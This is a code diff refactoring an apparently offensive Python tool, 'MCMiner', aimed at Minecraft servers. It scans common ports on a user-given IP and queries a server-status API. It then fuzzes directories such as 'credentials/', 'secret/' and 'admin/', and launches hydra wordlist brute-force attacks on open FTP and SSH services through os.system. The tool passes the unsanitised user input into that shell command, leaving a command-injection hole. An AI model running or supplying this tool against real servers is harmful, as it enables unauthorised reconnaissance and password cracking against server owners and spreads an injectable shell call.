@@ -14,91 +14,71 @@ Fore.R = Fore.RESET
 Fore.Y = Fore.YELLOW
 Fore.LBEX = Fore.LIGHTBLACK_EX
 Fore.LWEX = Fore.LIGHTWHITE_EX
-
 init()
 
-folders_and_files = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/',
-                     'robots.txt', 'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/',
-                     'Login/',
-                     'Register/', 'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/',
-                     'minecraft/', 'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/',
-                     'admin/', 'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
-
+TARGET_DATA = ['database/', 'db/', 'imgs/', 'index.html', 'index.php', 'register/', 'login/', 'sql/', 'robots.txt',
+               'credentials/', 'secret/', 'videos/', 'images/', 'js/', 'scripts/', 'style/', 'Login/', 'Register/',
+               'logs/', 'users/', 'store/', 'transactions/', 'staff/', 'test/', 'tests/', 'css/', 'minecraft/',
+               'rules/', 'vote/', 'search/', 'realms/', 'about/', '.htaccess', 'data/', 'logins/', 'admin/',
+               'accounts/', 'access/', 'assets/', 'sitemap.xml', 'ghost/', 'p/', 'email/']
 TryFTP = False
 TrySSH = False
 ScrapeWeb = False
 
 os.system('title MCMiner by wfsec')
-
 print(f'''
 
-{Fore.LG}        
-{Fore.GREEN}                ███╗   ███╗██╗███╗   ██╗███████╗██████╗ 
-{Fore.LG}                ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗
-{Fore.GREEN}                ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝
-{Fore.LG}                ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗
-{Fore.GREEN}                ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║
-{Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
-''')
-print('')
+    {Fore.LG}        
+    {Fore.GREEN}                ███╗   ███╗██╗███╗   ██╗███████╗██████╗ 
+    {Fore.LG}                ████╗ ████║██║████╗  ██║██╔════╝██╔══██╗
+    {Fore.GREEN}                ██╔████╔██║██║██╔██╗ ██║█████╗  ██████╔╝
+    {Fore.LG}                ██║╚██╔╝██║██║██║╚██╗██║██╔══╝  ██╔══██╗
+    {Fore.GREEN}                ██║ ╚═╝ ██║██║██║ ╚████║███████╗██║  ██║
+    {Fore.LG}                ╚═╝     ╚═╝╚═╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝{Fore.R}                                                                        
+    ''')
+
 ip = input('            IP: ')
-
-server_ip = socket.gethostbyname(ip)
-
 print('')
 print('')
 
-global proto, s
-ports = [21, 22, 23, 53, 80, 443, 3389, 8080, 19312, 25565]
+PORTS = {21: 'FTP',
+         22: 'SSH',
+         23: 'TELNET',
+         53: 'DNS',
+         80: 'HTTP',
+         443: 'HTTPS',
+         3389: 'RDP',
+         8080: 'ALT HTTP',
+         19312: 'Bedrock',
+         25565: 'MCServer'}
 
-for x in ports:
-    if x == 21:
-        proto = 'FTP'
-    elif x == 22:
-        proto = 'SSH'
-    elif x == 23:
-        proto = 'TELNET'
-    elif x == 53:
-        proto = 'DNS'
-    elif x == 80:
-        proto = 'HTTP'
-    elif x == 443:
-        proto = 'HTTPS'
-    elif x == 3389:
-        proto = 'RDP'
-    elif x == 8080:
-        proto = 'ALT HTTP'
-    elif x == 19312:
-        proto = 'Bedrock'
-    elif x == 25565:
-        proto = 'Java'
-    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    s.settimeout(3)  # If host does not react after 3 seconds, it closes
-    result = s.connect_ex((ip, x))
+for port in PORTS:
+    SOCKET = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    SOCKET.settimeout(2)  # Terminate connection if no response after 3 seconds
+    result = SOCKET.connect_ex((ip, port))
+
     if result == 0:
-        if x == 21:
+        if port == 21:
             TryFTP = True
-        if x == 22:
+        if port == 22:
             TrySSH = True
-        if x == 80:
+        if port == 80:
             ScrapeWeb = True
-        print(f'{Fore.LG}       [+]{Fore.W} Port {x} is open on [{ip}] {Fore.YELLOW}[{x}/{proto}]{Fore.W}')
-        s.close()
+        print(f'{Fore.LG}       [+]{Fore.W} Port {port} is open on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
+        SOCKET.close()
     else:
-        print(f'{Fore.LR}       [-]{Fore.W} Port {x} is closed on [{ip}] {Fore.YELLOW}[{x}/{proto}]{Fore.W}')
-        s.close()
+        print(
+            f'{Fore.LR}       [-]{Fore.W} Port {port} is closed on [{ip}] {Fore.YELLOW}[{port}/{PORTS[port]}]{Fore.W}')
+        SOCKET.close()
 
-theurl = f'https://api.mcsrvstat.us/2/{ip}'
-r = requests.get(theurl)
-data = r.text
-
+resp = requests.get(f'https://api.mcsrvstat.us/2/{ip}')  # Query the server status API
 print('')
 
-SRV = r.json().get("srv")
-SERVER_IP = r.json().get("ip")
-ONLINE_MODE = r.json().get("online")
-VERSION = r.json().get("version")
-QUERY = r.json().get("query")
+SRV = resp.json().get("srv")
+SERVER_IP = resp.json().get("ip")
+ONLINE_MODE = resp.json().get("online")
+VERSION = resp.json().get("version")
+QUERY = resp.json().get("query")
 
 print(f'''
             {Fore.RED}Query:{Fore.R} {QUERY}
@@ -109,11 +89,10 @@ print(f'''
 ''')
 
 
-def fuzz(dir):
-    global fuzz_url, r, meaning, color
-    fuzz_url = f'http://{ip}/{dir}'
-    r = requests.get(fuzz_url, headers=user_agent)
-    status = r.status_code
+def fuzz(directory):
+    fuzz_url = f'http://{ip}/{directory}'
+    status = requests.get(fuzz_url, headers=user_agent).status_code
+
     if status == 200:
         meaning = '[OK]'
         color = Fore.LIGHTGREEN_EX
@@ -126,14 +105,17 @@ def fuzz(dir):
     elif status == 429:
         meaning = '[Too Many Requests]'
         color = Fore.LIGHTYELLOW_EX
+    else:
+        meaning = '[Unknown]'
+        color = Fore.LIGHTBLUE_EX
     print(f'            {color}[{status}] {meaning} {Fore.W} {fuzz_url}')
 
 
-def threads_thing():
-    for dir in folders_and_files:
-        fuzzThread = threading.Thread(target=fuzz, args=(dir,), daemon=True)  # Starts the fuzzing thread
+def threads_handler():
+    for directory in TARGET_DATA:
+        fuzz_thread = threading.Thread(target=fuzz, args=(directory,), daemon=True)  # Starts the fuzzing thread
         time.sleep(1)
-        fuzzThread.start()
+        fuzz_thread.start()
 
 
 if ScrapeWeb:
@@ -151,17 +133,16 @@ if ScrapeWeb:
             {Fore.LB}Content type:{Fore.W} {d.headers["content-type"]}
         ''')
         print('')
+
         fuzzask = input('            Do you want to fuzz the site? y/n: ')
         if fuzzask == 'y':
-            threads_thing()
-
+            threads_handler()
         else:
             print('               Ok.')
-            pass
 
 if TryFTP:
     print('')
-    FTPASK = input('            Do you want to Wordlist attack the FTP? y/n: ')
+    FTPASK = input('            Do you want to Wordlist attack on FTP? y/n: ')
     if FTPASK == 'y':
         the_proto = 'ftp'
         ftp_username_wordlist = input('             Username Wordlist: ')
@@ -170,12 +151,11 @@ if TryFTP:
         os.system(f'hydra -L {ftp_username_wordlist} -P {ftp_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
     else:
         print('''               Ok.
-                ''')
-        pass
+                    ''')
 
 if TrySSH:
     print('')
-    SSHASK = input('            Do you want to Wordlist attack the SSH? y/n: ')
+    SSHASK = input('            Do you want to Wordlist attack on SSH? y/n: ')
     if SSHASK == 'y':
         the_proto = 'ssh'
         ssh_username_wordlist = input('             Username Wordlist: ')
@@ -184,5 +164,5 @@ if TrySSH:
         os.system(f'hydra -L {ssh_username_wordlist} -P {ssh_password_wordlist} -I -V -t 4 -K {ip} {the_proto}')
     else:
         print('''               Ok.
-                ''')
-        pass
+                    ''')
+        
